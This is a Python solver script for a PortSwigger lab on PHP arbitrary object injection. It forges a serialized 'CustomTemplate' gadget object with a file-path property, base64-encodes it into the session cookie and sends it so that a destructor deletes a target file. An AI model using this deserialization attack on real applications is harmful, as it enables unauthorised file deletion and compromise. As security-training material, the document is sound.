"""
Lab 4: Arbitrary object injection in PHP
https://portswigger.net/web-security/deserialization/exploiting/lab-arbitrary-object-injection-in-php
Difficulty: Practitioner

📝 The app deserializes a session field expecting a specific class
(commonly something like a "User" object), but doesn't validate WHICH
class actually ends up instantiated. Swap in a DIFFERENT class already
defined in the app's own source (visible via the product catalog, which
often includes a vulnerable "CustomTemplate" / logging-style class) whose
__destruct() or __wakeup() has an exploitable side effect — e.g. deleting
an arbitrary file via a filename property.
"""

import base64

from utils import get_session, log, note, php_serialize_object

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}

# This class/property shape needs confirming from the app's own disclosed
# source (commonly visible via a "View details" / CustomTemplate feature
# on a product page in this lab) — representative structure shown here.
GADGET_CLASS = "CustomTemplate"
GADGET_PROPERTIES = {"template_file_path": "/home/carlos/morale.txt"}


def run():
    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)

    note(f"Looking for the '{GADGET_CLASS}' class definition in the app's")
    note("own disclosed source (often visible via a product's 'view details'")
    note("or similar debug feature) to confirm the EXACT property name(s)")
    note("before relying on the placeholder above.")

    payload = php_serialize_object(GADGET_CLASS, GADGET_PROPERTIES)
    note(f"Forged object: {payload}")

    new_cookie = base64.b64encode(payload.encode()).decode()
    s.cookies.set("session", new_cookie)

    r = s.get(f"{TARGET}/")
    log(f"Status after sending forged object cookie: {r.status_code}")
    print(r.text[-300:])

    note("Success is usually silent (a __destruct side effect, like a file")
    note("deletion) — check the lab's own solved-indicator rather than")
    note("expecting a direct response confirmation.")


if __name__ == "__main__":
    run()
